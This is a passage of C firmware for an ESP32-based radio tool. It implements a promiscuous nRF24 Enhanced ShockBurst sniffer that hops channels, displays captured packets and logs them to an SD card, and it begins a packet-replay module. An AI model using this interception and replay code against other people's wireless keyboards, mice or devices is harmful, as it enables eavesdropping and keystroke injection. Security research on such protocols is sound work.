                  SD_MOSI, CSN, 8000000, false);
}
static void EsbSniffer_bleSetEsbNavLabels(void) {
  setTouchNavLabels("Save", "Pause", "Exit", "Hop", "Clear");
}
static void EsbSniffer_esbApplyChannel(uint8_t ch) {
  EsbSniffer_esbDisable();
  EsbSniffer_esbSetRegister(_ESB_RF_CH, ch);
  EsbSniffer_esbFlushRx();
  EsbSniffer_esbEnable();
  esp_rom_delay_us(130);
}

static void EsbSniffer_esbConfigureRadio(void) {
  EsbSniffer_esbDisable();
  EsbSniffer_esbPowerUp();

  EsbSniffer_esbWriteRegMulti(_ESB_RX_ADDR_P0, EsbSniffer_kPromiscAddr, 5);
  EsbSniffer_esbSetRegister(_ESB_EN_AA, 0x00);
  EsbSniffer_esbSetRegister(_ESB_EN_RXADDR, 0x01);
  EsbSniffer_esbSetRegister(_ESB_SETUP_AW, 0x03);
  EsbSniffer_esbSetRegister(_ESB_SETUP_RETR, 0x00);
  EsbSniffer_esbSetRegister(_ESB_RF_SETUP, 0x0F);
  EsbSniffer_esbSetRegister(_ESB_RX_PW_P0, EsbSniffer_kEsbPayloadMax);
  EsbSniffer_esbSetRegister(_ESB_CONFIG, 0x0B);

  EsbSniffer_esbApplyChannel(EsbSniffer_s_channel);
}

static bool EsbSniffer_esbSwitchToSdSpi(void) {
  EsbSniffer_esbDisable();
  spi_device_deselect(&(EsbSniffer_radio_transport));
  return true;
}

static bool EsbSniffer_esbMountSd(void) {
  if (!EsbSniffer_esbSwitchToSdSpi()) {
    return false;
  }
#ifdef SD_CS
  if (storage_mount_card(SD_CS)) {
    return true;
  }
#endif
#ifdef SD_CS_PIN
#ifdef CC1101_CS
  if (SD_CS_PIN != CC1101_CS && storage_mount_card(SD_CS_PIN)) {
    return true;
  }
#else
  if (storage_mount_card(SD_CS_PIN)) {
    return true;
  }
#endif
#endif
  return false;
}

static bool EsbSniffer_esbEnsureDir(void) {
  if (!EsbSniffer_esbMountSd()) {
    return false;
  }
  if (storage_exists(EsbSniffer_kEsbDir)) {
    return true;
  }
  if (storage_mkdir(EsbSniffer_kEsbDir)) {
    return true;
  }
  return storage_mkdir("esb");
}

static bool EsbSniffer_esbMakeNextPath(text_t* outPath) {
  char buf[40];
  for (uint16_t i = 0; i < 10000; i++) {
    snprintf(buf, sizeof(buf), "%s%04u.log", EsbSniffer_kEsbFilePrefix,
             (unsigned)i);
    if (!storage_exists(buf)) {
      (*outPath) = TEXT(buf);
      return true;
    }
  }
  return false;
}

static bool EsbSniffer_esbOpenLogFile(void) {
  if (EsbSniffer_s_logFileOpen) {
    return true;
  }
  if (!EsbSniffer_esbEnsureDir()) {
    return false;
  }
  if (!EsbSniffer_esbMakeNextPath(&(EsbSniffer_s_logPath))) {
    return false;
  }
  storage_file_replace(&(EsbSniffer_s_logFile),
                       storage_file_open((EsbSniffer_s_logPath).data, "wb"));
  if (!storage_file_valid(&(EsbSniffer_s_logFile))) {
    EsbSniffer_s_logPath = TEXT("");
    EsbSniffer_esbInitRadioSpi();
    EsbSniffer_esbConfigureRadio();
    return false;
  }
  storage_file_print_line_cstr(&(EsbSniffer_s_logFile),
                               "# ESP32-DIV ESB Sniffer");
  storage_file_print_line_cstr(&(EsbSniffer_s_logFile),
                               "# format: ms,ch,len,hex");
  storage_file_flush(&(EsbSniffer_s_logFile));
  EsbSniffer_s_logFileOpen = true;
  EsbSniffer_esbInitRadioSpi();
  EsbSniffer_esbConfigureRadio();
  return true;
}

static void EsbSniffer_esbCloseLogFile(void) {
  if ((EsbSniffer_s_logFileOpen &&
       storage_file_valid(&(EsbSniffer_s_logFile)))) {
    if (EsbSniffer_esbSwitchToSdSpi()) {
      storage_file_flush(&(EsbSniffer_s_logFile));
      storage_file_close(&(EsbSniffer_s_logFile));
    }
    EsbSniffer_esbInitRadioSpi();
    EsbSniffer_esbConfigureRadio();
  }
  EsbSniffer_s_logFileOpen = false;
}

static int EsbSniffer_esbTrimPayloadLen(const uint8_t* payload, int maxLen) {
  int len = maxLen;
  while (len > 1 && payload[len - 1] == 0x00) {
    len--;
  }
  return len;
}

static text_t EsbSniffer_esbPayloadHex(const uint8_t* payload, int len) {
  static char hexBuf[3 * EsbSniffer_kEsbPayloadMax + 1];
  int pos = 0;
  for (int i = 0; i < len && pos < (int)sizeof(hexBuf) - 3; i++) {
    pos += snprintf(hexBuf + pos, sizeof(hexBuf) - pos, "%02X", payload[i]);
  }
  hexBuf[pos] = '\0';
  return TEXT(hexBuf);
}

static text_t EsbSniffer_esbChannelGHzText(uint8_t ch) {
  const uint16_t mhz = (uint16_t)(2400 + ch);
  char buf[10];
  snprintf(buf, sizeof(buf), "%u.%03u", mhz / 1000, mhz % 1000);
  return TEXT(buf);
}

static void EsbSniffer_esbAppendLogLine(text_t text, uint16_t color) {
  const int visible = EsbSniffer_esbVisibleLogLines();
  for (int i = visible - 1; i > 0; i--) {
    EsbSniffer_s_logBuffer[i] = EsbSniffer_s_logBuffer[i - 1];
    EsbSniffer_s_logColor[i] = EsbSniffer_s_logColor[i - 1];
  }
  EsbSniffer_s_logBuffer[0] = text;
  EsbSniffer_s_logColor[0] = color;
  if (EsbSniffer_s_logIndex < visible) {
    EsbSniffer_s_logIndex++;
  }
  EsbSniffer_s_esbLogDirty = true;
}

enum { EsbSniffer_kEsbStatPadX = 10 };
enum { EsbSniffer_kEsbStatValueX = 70 };
enum { EsbSniffer_kEsbStatTextDy = 2 };

static void EsbSniffer_esbPaintTextLine(int x, int y, int maxW, int lineH,
                                        text_t* cacheText, uint16_t* cacheColor,
                                        int* cacheW, text_t text,
                                        uint16_t color, bool force) {
  if (!force && (strcmp(((*cacheText)).data, (text).data) == 0) &&
      (*cacheColor) == color) {
    return;
  }
  display_set_text_datum(&(tft), TL_DATUM);
  display_set_text_size(&(tft), 1);
  const int newW = strlen((text).data)
                       ? (display_text_width(&(tft), (text).data, 0) + 2)
                       : 0;
  int clearW = (*cacheW) > newW ? (*cacheW) : newW;
  if (clearW < 8) {
    clearW = maxW;
  }
  if (clearW > maxW) {
    clearW = maxW;
  }
  display_fill_rect(&(tft), x, y, clearW, lineH, TFT_BLACK);
  if (strlen((text).data)) {
    display_set_text_color_2(&(tft), color, TFT_BLACK);
    display_set_cursor(&(tft), x, y + EsbSniffer_kEsbStatTextDy);
    display_print(&(tft), (text).data);
  }
  (*cacheText) = text;
  (*cacheColor) = color;
  (*cacheW) = newW > 0 ? newW : 0;
}

static void EsbSniffer_esbRedrawLog(void) {
  const int endY = EsbSniffer_esbLogEndY();
  const int visible = EsbSniffer_esbVisibleLogLines();
  const int maxW = display_width(&(tft)) - 16;
  display_set_text_datum(&(tft), TL_DATUM);
  for (int i = 0; i < visible; i++) {
    const int y = EsbSniffer_kEsbLogStartY + i * EsbSniffer_kEsbLineHeight;
    if (y + EsbSniffer_kEsbLineHeight > endY) {
      break;
    }
    if (i < EsbSniffer_s_logIndex) {
      EsbSniffer_esbPaintTextLine(
          EsbSniffer_kEsbStatPadX, y, maxW, EsbSniffer_kEsbLineHeight,
          &(EsbSniffer_s_logDrawn[i]), &(EsbSniffer_s_logDrawnColor[i]),
          &(EsbSniffer_s_logDrawnW[i]), EsbSniffer_s_logBuffer[i],
          EsbSniffer_s_logColor[i], false);
    } else {
      EsbSniffer_esbPaintTextLine(
          EsbSniffer_kEsbStatPadX, y, maxW, EsbSniffer_kEsbLineHeight,
          &(EsbSniffer_s_logDrawn[i]), &(EsbSniffer_s_logDrawnColor[i]),
          &(EsbSniffer_s_logDrawnW[i]), TEXT(""), UI_DIM_TEXT, false);
    }
  }
  EsbSniffer_s_esbLogDirty = false;
}

static void EsbSniffer_esbDrawStatusValue(int line, text_t text,
                                          uint16_t color) {
  if (line < 0 || line >= EsbSniffer_kEsbStatusLines) {
    return;
  }
  const int y = EsbSniffer_kEsbStatusTextY + line * EsbSniffer_kEsbLineHeight;
  const int maxW = display_width(&(tft)) - EsbSniffer_kEsbStatValueX - 8;
  EsbSniffer_esbPaintTextLine(
      EsbSniffer_kEsbStatValueX, y, maxW, EsbSniffer_kEsbLineHeight,
      &(EsbSniffer_s_statusText[line]), &(EsbSniffer_s_statusColor[line]),
      &(EsbSniffer_s_statusDrawnW[line]), text, color, false);
}

static void EsbSniffer_esbDrawTextBoxes(void) {
  const int logH = EsbSniffer_esbLogBoxH();
  const int endY = EsbSniffer_esbLogEndY();
  display_fill_rect(&(tft), 0, EsbSniffer_kEsbStatusY - 2,
                    display_width(&(tft)), endY - EsbSniffer_kEsbStatusY + 4,
                    TFT_BLACK);
  display_draw_fast_h_line(&(tft), 0, 19, display_width(&(tft)), UI_LINE);
  display_draw_round_rect(&(tft), 4, EsbSniffer_kEsbStatusY,
                          display_width(&(tft)) - 8, EsbSniffer_kEsbStatusBoxH,
                          3, UI_LINE);
  display_draw_round_rect(&(tft), 4, EsbSniffer_kEsbLogBoxTop,
                          display_width(&(tft)) - 8, logH, 3, UI_LINE);

  display_set_text_datum(&(tft), TL_DATUM);
  display_set_text_size(&(tft), 1);
  display_set_text_color_2(&(tft), UI_DIM_TEXT, TFT_BLACK);
  display_set_cursor(&(tft), EsbSniffer_kEsbStatPadX,
                     EsbSniffer_kEsbStatusY + 3);
  display_print(&(tft), "Capture");
  display_set_cursor(&(tft), EsbSniffer_kEsbStatPadX,
                     EsbSniffer_kEsbLogBoxTop + 3);
  display_print(&(tft), "Packets");

  // Fixed label column — values update independently at kEsbStatValueX.
  static const char* kLabels[EsbSniffer_kEsbStatusLines] = {"Ch", "Pkts", "SD",
                                                            "Mode"};
  for (int i = 0; i < EsbSniffer_kEsbStatusLines; i++) {
    const int y = EsbSniffer_kEsbStatusTextY + i * EsbSniffer_kEsbLineHeight +
                  EsbSniffer_kEsbStatTextDy;
    display_set_text_color_2(&(tft), UI_DIM_TEXT, TFT_BLACK);
    display_set_cursor(&(tft), EsbSniffer_kEsbStatPadX, y);
    display_print(&(tft), (TEXT(kLabels[i])).data);
    EsbSniffer_s_statusText[i] = TEXT("");
    EsbSniffer_s_statusColor[i] = 0;
    EsbSniffer_s_statusDrawnW[i] = 0;
  }
  for (int i = 0; i < EsbSniffer_kEsbMaxLogLines; i++) {
    EsbSniffer_s_logDrawn[i] = TEXT("");
    EsbSniffer_s_logDrawnColor[i] = 0;
    EsbSniffer_s_logDrawnW[i] = 0;
  }
}

static void EsbSniffer_esbUpdateStatusPanel(void) {
  char chVal[28];
  snprintf(chVal, sizeof(chVal), "%u  %.8s GHz", (unsigned)EsbSniffer_s_channel,
           (EsbSniffer_esbChannelGHzText(EsbSniffer_s_channel)).data);
  EsbSniffer_esbDrawStatusValue(0, TEXT(chVal),
                                EsbSniffer_s_hopping ? ORANGE : UI_TEXT);

  char pktVal[28];
  snprintf(pktVal, sizeof(pktVal), "%lu  %lu/s",
           (unsigned long)EsbSniffer_s_packetTotal,
           (unsigned long)EsbSniffer_s_ratePerSec);
  EsbSniffer_esbDrawStatusValue(
      1, TEXT(pktVal), EsbSniffer_s_packetTotal > 0 ? UI_OK : UI_DIM_TEXT);

  if (EsbSniffer_s_logEnabled && EsbSniffer_s_sdReady &&
      EsbSniffer_s_logFileOpen) {
    const int slash =
        text_rfind_index(EsbSniffer_s_logPath, text_character('/'));
    text_t name =
        (slash >= 0 ? text_slice(EsbSniffer_s_logPath, slash + 1, SIZE_MAX)
                    : EsbSniffer_s_logPath);
    if (strlen((name).data) > 18) {
      name = text_slice(name, 0, 18);
    }
    EsbSniffer_esbDrawStatusValue(2, name, UI_OK);
  } else if (EsbSniffer_s_logEnabled && !EsbSniffer_s_sdReady) {
    EsbSniffer_esbDrawStatusValue(2, TEXT("not available"), UI_WARN);
  } else {
    EsbSniffer_esbDrawStatusValue(2, TEXT("logging off"), UI_DIM_TEXT);
  }

  text_t mode = TEXT(EsbSniffer_s_hopping ? "Hop" : "Fixed");
  text_append_cstr(
      &(mode),
      (TEXT(EsbSniffer_sniffing ? "  |  Sniffing" : "  |  Stopped")).data);
  EsbSniffer_esbDrawStatusValue(3, mode,
                                EsbSniffer_sniffing ? UI_OK : UI_DIM_TEXT);
  EsbSniffer_s_esbStatusDirty = false;
}

static void EsbSniffer_esbFlushUi(bool force) {
  const uint32_t now = sys_monotonic_ms();
  if (!force &&
      (now - EsbSniffer_s_esbLastUiMs) < EsbSniffer_kEsbUiMinIntervalMs) {
    return;
  }
  if (!EsbSniffer_s_esbLogDirty && !EsbSniffer_s_esbStatusDirty && !force) {
    return;
  }
  EsbSniffer_s_esbLastUiMs = now;
  if (EsbSniffer_s_esbStatusDirty || force) {
    EsbSniffer_esbUpdateStatusPanel();
  }
  if (EsbSniffer_s_esbLogDirty || force) {
    EsbSniffer_esbRedrawLog();
  }
}

static void EsbSniffer_esbWritePacketToSd(uint32_t ts, uint8_t ch,
                                          const uint8_t* payload, int len) {
  if (!EsbSniffer_s_logEnabled || !EsbSniffer_s_logFileOpen) {
    return;
  }
  if (!EsbSniffer_esbSwitchToSdSpi()) {
    EsbSniffer_s_sdReady = false;
    EsbSniffer_s_logFileOpen = false;
    EsbSniffer_esbInitRadioSpi();
    EsbSniffer_esbConfigureRadio();
    return;
  }
  if (storage_file_valid(&(EsbSniffer_s_logFile))) {
    storage_file_print_cstr(&(EsbSniffer_s_logFile), (TEXT(ts)).data);
    storage_file_print_cstr(&(EsbSniffer_s_logFile),
                            (text_character(',')).data);
    storage_file_print_cstr(&(EsbSniffer_s_logFile), (TEXT(ch)).data);
    storage_file_print_cstr(&(EsbSniffer_s_logFile),
                            (text_character(',')).data);
    storage_file_print_cstr(&(EsbSniffer_s_logFile), (TEXT(len)).data);
    storage_file_print_cstr(&(EsbSniffer_s_logFile),
                            (text_character(',')).data);
    storage_file_print_line_cstr(&(EsbSniffer_s_logFile),
                                 (EsbSniffer_esbPayloadHex(payload, len)).data);
    EsbSniffer_s_lastFlushMs = sys_monotonic_ms();
  }
  EsbSniffer_esbInitRadioSpi();
  EsbSniffer_esbConfigureRadio();
}

static void EsbSniffer_esbFlushLogFile(void) {
  if (!EsbSniffer_s_logFileOpen ||
      !storage_file_valid(&(EsbSniffer_s_logFile))) {
    return;
  }
  if (!EsbSniffer_esbSwitchToSdSpi()) {
    return;
  }
  storage_file_flush(&(EsbSniffer_s_logFile));
  EsbSniffer_esbInitRadioSpi();
  EsbSniffer_esbConfigureRadio();
}

static void EsbSniffer_esbOnPacket(uint8_t ch, const uint8_t* payload,
                                   int len) {
  EsbSniffer_s_packetTotal++;
  EsbSniffer_s_rateCount++;

  text_t preview = text_join_cstr(
      (text_join_cstr(
           (text_join_cstr(
                (text_join_cstr((text_join_cstr("+ ch", (TEXT(ch)).data)).data,
                                " ["))
                    .data,
                (TEXT(len)).data))
               .data,
           "] "))
          .data,
      (EsbSniffer_esbPayloadHex(payload, DIV_MIN(len, 8))).data);
  if (len > 8) {
    text_append_cstr(&(preview), "...");
  }
  EsbSniffer_esbAppendLogLine(preview, UI_TEXT);
  EsbSniffer_s_esbStatusDirty = true;

  if (EsbSniffer_s_logEnabled && EsbSniffer_s_sdReady) {
    EsbSniffer_esbWritePacketToSd(sys_monotonic_ms(), ch, payload, len);
  }
}

static bool EsbSniffer_esbRxAvailable(void) {
  return (EsbSniffer_esbGetRegister(_ESB_STATUS) & 0x40) != 0;
}

static void EsbSniffer_esbReadPacket(void) {
  uint8_t payload[EsbSniffer_kEsbPayloadMax];
  spi_device_select(&(EsbSniffer_radio_transport));
  spi_device_transfer(&(EsbSniffer_radio_transport), 0x61);
  for (int i = 0; i < EsbSniffer_kEsbPayloadMax; i++) {
    payload[i] = spi_device_transfer(&(EsbSniffer_radio_transport), 0xFF);
  }
  spi_device_deselect(&(EsbSniffer_radio_transport));
  EsbSniffer_esbSetRegister(_ESB_STATUS, 0x70);

  const int len =
      EsbSniffer_esbTrimPayloadLen(payload, EsbSniffer_kEsbPayloadMax);
  EsbSniffer_esbOnPacket(EsbSniffer_s_channel, payload, len);
}

static void EsbSniffer_esbPollPackets(void) {
  uint8_t guard = 0;
  while (EsbSniffer_sniffing && EsbSniffer_esbRxAvailable() && guard < 8) {
    EsbSniffer_esbReadPacket();
    guard++;
  }
}

static void EsbSniffer_esbUpdateRate(void) {
  const uint32_t now = sys_monotonic_ms();
  if (now - EsbSniffer_s_rateLastMs >= 1000) {
    EsbSniffer_s_ratePerSec = EsbSniffer_s_rateCount;
    EsbSniffer_s_rateCount = 0;
    EsbSniffer_s_rateLastMs = now;
    EsbSniffer_s_esbStatusDirty = true;
  }
}

static void EsbSniffer_esbStepHop(void) {
  if (!EsbSniffer_s_hopping) {
    return;
  }
  const uint32_t now = sys_monotonic_ms();
  if (now - EsbSniffer_s_lastHopMs < EsbSniffer_kEsbHopIntervalMs) {
    return;
  }
  EsbSniffer_s_lastHopMs = now;
  EsbSniffer_s_hopIndex = (EsbSniffer_s_hopIndex + 1) % EsbSniffer_kHopCount;
  EsbSniffer_s_channel = EsbSniffer_kHopChannels[EsbSniffer_s_hopIndex];
  EsbSniffer_esbApplyChannel(EsbSniffer_s_channel);
  EsbSniffer_s_esbStatusDirty = true;
}

static void EsbSniffer_esbChannelDown(void) {
  if (EsbSniffer_s_hopping || EsbSniffer_s_channel == 0) {
    return;
  }
  EsbSniffer_s_channel--;
  EsbSniffer_esbApplyChannel(EsbSniffer_s_channel);
  EsbSniffer_s_esbStatusDirty = true;
  EsbSniffer_esbFlushUi(true);
}

static void EsbSniffer_esbChannelUp(void) {
  if (EsbSniffer_s_hopping || EsbSniffer_s_channel >= 125) {
    return;
  }
  EsbSniffer_s_channel++;
  EsbSniffer_esbApplyChannel(EsbSniffer_s_channel);
  EsbSniffer_s_esbStatusDirty = true;
  EsbSniffer_esbFlushUi(true);
}

static void EsbSniffer_esbToggleHop(void) {
  EsbSniffer_s_hopping = !EsbSniffer_s_hopping;
  if (EsbSniffer_s_hopping) {
    EsbSniffer_s_hopIndex = 0;
    EsbSniffer_s_channel = EsbSniffer_kHopChannels[0];
    EsbSniffer_esbApplyChannel(EsbSniffer_s_channel);
    EsbSniffer_esbAppendLogLine(TEXT("[*] Hop enabled"), UI_WARN);
  } else {
    EsbSniffer_esbAppendLogLine(TEXT("[*] Fixed channel"), UI_DIM_TEXT);
  }
  EsbSniffer_s_esbStatusDirty = true;
  EsbSniffer_esbFlushUi(true);
}

static void EsbSniffer_esbToggleLog(void) {
  EsbSniffer_s_logEnabled = !EsbSniffer_s_logEnabled;
  if (EsbSniffer_s_logEnabled) {
    EsbSniffer_s_sdReady = EsbSniffer_esbOpenLogFile();
    if (!EsbSniffer_s_sdReady) {
      EsbSniffer_s_logEnabled = false;
      EsbSniffer_esbAppendLogLine(TEXT("[!] SD open failed"), UI_WARN);
    } else {
      EsbSniffer_esbAppendLogLine(TEXT("[+] SD logging on"), UI_OK);
    }
  } else {
    EsbSniffer_esbCloseLogFile();
    EsbSniffer_esbAppendLogLine(TEXT("[*] SD logging off"), UI_DIM_TEXT);
  }
  EsbSniffer_s_esbStatusDirty = true;
  EsbSniffer_esbFlushUi(true);
}

static unsigned long EsbSniffer_s_esbLastBtnMs = 0;
static const unsigned long EsbSniffer_kEsbNavDebounceMs = 80;

static void EsbSniffer_esbWaitNavRelease(int pin) {
  const uint32_t t0 = sys_monotonic_ms();
  while (isTouchNavButtonPressed(pin) && sys_monotonic_ms() - t0 < 400) {
    sys_sleep_ms(5);
  }
  sys_sleep_ms(30);
}

void EsbSniffer_esbHandleNavButtons(void) {
  if (!featureHasTouchNavBar()) {
    return;
  }
  const uint32_t now = sys_monotonic_ms();
  if (now - EsbSniffer_s_esbLastBtnMs < EsbSniffer_kEsbNavDebounceMs) {
    return;
  }

  if (isTouchNavButtonPressedEdge(BTN_LEFT)) {
    EsbSniffer_esbChannelDown();
    EsbSniffer_s_esbLastBtnMs = sys_monotonic_ms();
    EsbSniffer_esbWaitNavRelease(BTN_LEFT);
    return;
  }
  if (isTouchNavButtonPressedEdge(BTN_RIGHT)) {
    EsbSniffer_esbChannelUp();
    EsbSniffer_s_esbLastBtnMs = sys_monotonic_ms();
    EsbSniffer_esbWaitNavRelease(BTN_RIGHT);
    return;
  }
  if (isTouchNavButtonPressedEdge(BTN_UP)) {
    EsbSniffer_esbToggleHop();
    EsbSniffer_s_esbLastBtnMs = sys_monotonic_ms();
    EsbSniffer_esbWaitNavRelease(BTN_UP);
    return;
  }
  if (isTouchNavButtonPressedEdge(BTN_DOWN)) {
    EsbSniffer_esbToggleLog();
    EsbSniffer_s_esbLastBtnMs = sys_monotonic_ms();
    EsbSniffer_esbWaitNavRelease(BTN_DOWN);
  }
}

static void EsbSniffer_esbPollNavButtons(void) {
  EsbSniffer_esbHandleNavButtons();
}

void EsbSniffer_runUI(void) {
  // Avoid Scanner_runUI macros (STATUS_BAR_*, ICON_*) which leak globally.
  enum { kBarY = 20 };
  enum { kBarH = 16 };
  enum { kIconSz = 16 };
  enum { kIconN = 5 };
  // Same spacing as BleSpoofer: back @10, then 40px steps from 90.
  static int iconX[kIconN] = {90, 130, 170, 210, 10};
  static int iconY = kBarY;

  static const unsigned char* icons[kIconN] = {
      bitmap_icon_LEFT, bitmap_icon_random, bitmap_icon_sdcard,
      bitmap_icon_RIGHT, bitmap_icon_go_back};

  if (!EsbSniffer_uiDrawn) {
    display_fill_rect(&(tft), 0, kBarY, 240, kBarH, DARK_GRAY);

    for (int i = 0; i < kIconN; i++) {
      if (icons[i] != NULL) {
        display_draw_bitmap(&(tft), iconX[i], iconY, icons[i], kIconSz, kIconSz,
                            UI_ICON);
      }
    }
    display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);
    display_draw_fast_h_line(&(tft), 0, kBarY + kBarH, 240, UI_LINE);
    EsbSniffer_uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && sys_monotonic_ms() - lastAnimationTime >= 150) {
    if (animationState == 1) {
      display_draw_bitmap(&(tft), iconX[activeIcon], iconY, icons[activeIcon],
                          kIconSz, kIconSz, UI_ICON);
      animationState = 2;

      switch (activeIcon) {
        case 0:
          EsbSniffer_esbChannelDown();
          break;
        case 1:
          EsbSniffer_esbToggleHop();
          break;
        case 2:
          EsbSniffer_esbToggleLog();
          break;
        case 3:
          EsbSniffer_esbChannelUp();
          break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = sys_monotonic_ms();
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (sys_monotonic_ms() - lastTouchCheck >= touchCheckInterval) {
    int x, y;
    if (feature_active && readTouchXY(&(x), &(y))) {
      if (y > kBarY && y < kBarY + kBarH) {
        for (int i = 0; i < kIconN; i++) {
          if (x > iconX[i] && x < iconX[i] + kIconSz) {
            if (icons[i] != NULL && animationState == 0) {
              if (i == 4) {
                feature_exit_requested = true;
                EsbSniffer_sniffing = false;
              } else {
                display_draw_bitmap(&(tft), iconX[i], iconY, icons[i], kIconSz,
                                    kIconSz, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = sys_monotonic_ms();
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = sys_monotonic_ms();
  }
}

void EsbSniffer_esbSnifferSetup(void) {
  setTouchButtonInputEnabled(true);
  EsbSniffer_bleSetEsbNavLabels();
  bleClearBody(TFT_BLACK);

  EsbSniffer_uiDrawn = false;
  EsbSniffer_sniffing = true;
  EsbSniffer_s_channel = 76;
  EsbSniffer_s_hopping = false;
  EsbSniffer_s_logEnabled = true;
  EsbSniffer_s_sdReady = false;
  EsbSniffer_s_logFileOpen = false;
  EsbSniffer_s_logPath = TEXT("");
  EsbSniffer_s_packetTotal = 0;
  EsbSniffer_s_rateCount = 0;
  EsbSniffer_s_rateLastMs = sys_monotonic_ms();
  EsbSniffer_s_ratePerSec = 0;
  EsbSniffer_s_lastFlushMs = sys_monotonic_ms();
  EsbSniffer_s_lastHopMs = sys_monotonic_ms();
  EsbSniffer_s_hopIndex = 0;
  EsbSniffer_s_logIndex = 0;
  EsbSniffer_s_esbLogDirty = false;
  EsbSniffer_s_esbStatusDirty = false;
  EsbSniffer_s_esbLastUiMs = 0;
  for (int i = 0; i < EsbSniffer_kEsbMaxLogLines; i++) {
    EsbSniffer_s_logBuffer[i] = TEXT("");
    EsbSniffer_s_logColor[i] = UI_DIM_TEXT;
    EsbSniffer_s_logDrawn[i] = TEXT("");
    EsbSniffer_s_logDrawnColor[i] = 0;
    EsbSniffer_s_logDrawnW[i] = 0;
  }
  for (int i = 0; i < EsbSniffer_kEsbStatusLines; i++) {
    EsbSniffer_s_statusText[i] = TEXT("");
    EsbSniffer_s_statusColor[i] = 0;
    EsbSniffer_s_statusDrawnW[i] = 0;
  }

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true, false);
  redrawTouchButtonBar();

  EsbSniffer_runUI();
  EsbSniffer_esbDrawTextBoxes();
  EsbSniffer_esbAppendLogLine(TEXT("[+] ESB sniffer ready"), UI_WARN);
  EsbSniffer_s_esbStatusDirty = true;
  EsbSniffer_esbFlushUi(true);
  redrawTouchButtonBar();

  setupTouchscreen();

  sys_configure_gpio(CE, GPIO_MODE_OUTPUT);
  sys_configure_gpio(CSN, GPIO_MODE_OUTPUT);
  EsbSniffer_esbInitRadioSpi();
  EsbSniffer_esbConfigureRadio();

  EsbSniffer_s_sdReady = EsbSniffer_esbOpenLogFile();
  if (EsbSniffer_s_sdReady) {
    EsbSniffer_esbAppendLogLine(TEXT("[+] Logging to SD"), UI_OK);
  } else {
    EsbSniffer_esbAppendLogLine(TEXT("[!] No SD card"), UI_WARN);
    EsbSniffer_s_logEnabled = false;
  }
  EsbSniffer_s_esbStatusDirty = true;
  EsbSniffer_esbFlushUi(true);
  redrawTouchButtonBar();
}

void EsbSniffer_esbSnifferLoop(void) {
  EsbSniffer_sniffing = true;
  while (EsbSniffer_sniffing) {
    if (feature_active &&
        (feature_exit_requested || featureExitButtonPressed())) {
      feature_exit_requested = true;
      EsbSniffer_sniffing = false;
      break;
    }

    EsbSniffer_esbPollNavButtons();
    maintainTouchNavBar();
    EsbSniffer_runUI();
    EsbSniffer_esbStepHop();
    EsbSniffer_esbPollPackets();
    EsbSniffer_esbUpdateRate();
    EsbSniffer_esbFlushUi(false);

    const uint32_t now = sys_monotonic_ms();
    if (EsbSniffer_s_logFileOpen &&
        now - EsbSniffer_s_lastFlushMs >= EsbSniffer_kEsbFlushIntervalMs) {
      EsbSniffer_esbFlushLogFile();
      EsbSniffer_s_lastFlushMs = now;
    }

    sys_sleep_ms(1);
  }
}

void EsbSniffer_exit(void) {
  EsbSniffer_sniffing = false;
  EsbSniffer_esbDisable();
  EsbSniffer_esbPowerDown();
  spi_device_deselect(&(EsbSniffer_radio_transport));
  EsbSniffer_esbCloseLogFile();
  refreshSdMount();
}

static spi_device_t EsbReplay_radio_transport;

#undef CE
#define CE NRF24_SCAN_CE
#undef CSN
#define CSN NRF24_SCAN_CSN

#undef _RP_CONFIG
#define _RP_CONFIG 0x00
#undef _RP_EN_AA
#define _RP_EN_AA 0x01
#undef _RP_EN_RXADDR
#define _RP_EN_RXADDR 0x02
#undef _RP_SETUP_AW
#define _RP_SETUP_AW 0x03
#undef _RP_SETUP_RETR
#define _RP_SETUP_RETR 0x04
#undef _RP_RF_CH
#define _RP_RF_CH 0x05
#undef _RP_RF_SETUP
#define _RP_RF_SETUP 0x06
#undef _RP_STATUS
#define _RP_STATUS 0x07
#undef _RP_RX_ADDR_P0
#define _RP_RX_ADDR_P0 0x0A
#undef _RP_TX_ADDR
#define _RP_TX_ADDR 0x10
#undef _RP_RX_PW_P0
#define _RP_RX_PW_P0 0x11

enum { EsbReplay_kRpPayloadMax = 32 };
#if BOARD_HAS_ESP32S3
enum { EsbReplay_kRpMaxCaptures = 8 };
enum { EsbReplay_kRpMaxSelLines = 8 };
enum { EsbReplay_kRpMaxLogLines = 10 };
#else
enum { EsbReplay_kRpMaxCaptures = ESP32DIV_ESB_RP_CAPTURES };
enum { EsbReplay_kRpMaxSelLines = ESP32DIV_ESB_RP_SEL_LINES };
enum { EsbReplay_kRpMaxLogLines = ESP32DIV_ESB_RP_LOG_LINES };
#endif
enum { EsbReplay_kRpStatusLines = 3 };
enum { EsbReplay_kRpSelVisible = 5 };
enum { EsbReplay_kRpLineHeight = 12 };
enum { EsbReplay_kRpToolbarBottom = 36 };
enum { EsbReplay_kRpToolbarGap = 8 };
enum {
  EsbReplay_kRpStatusY = EsbReplay_kRpToolbarBottom + EsbReplay_kRpToolbarGap
};
enum { EsbReplay_kRpBoxHeaderH = 15 };
enum {
  EsbReplay_kRpStatusTextY = EsbReplay_kRpStatusY + EsbReplay_kRpBoxHeaderH
};
enum {
  EsbReplay_kRpStatusBoxH = EsbReplay_kRpBoxHeaderH +
  (EsbReplay_kRpStatusLines * EsbReplay_kRpLineHeight) + 4
};
enum { EsbReplay_kRpPanelGap = 4 };
enum {
  EsbReplay_kRpSelBoxTop = EsbReplay_kRpStatusY + EsbReplay_kRpStatusBoxH +
  EsbReplay_kRpPanelGap
};
enum {
  EsbReplay_kRpSelBoxH = EsbReplay_kRpBoxHeaderH +
  (EsbReplay_kRpSelVisible * EsbReplay_kRpLineHeight) + 4
};
enum {
  EsbReplay_kRpSelStartY = EsbReplay_kRpSelBoxTop + EsbReplay_kRpBoxHeaderH
};
enum {
  EsbReplay_kRpLogBoxTop = EsbReplay_kRpSelBoxTop + EsbReplay_kRpSelBoxH +
  EsbReplay_kRpPanelGap
};
enum {
  EsbReplay_kRpLogStartY = EsbReplay_kRpLogBoxTop + EsbReplay_kRpBoxHeaderH
};
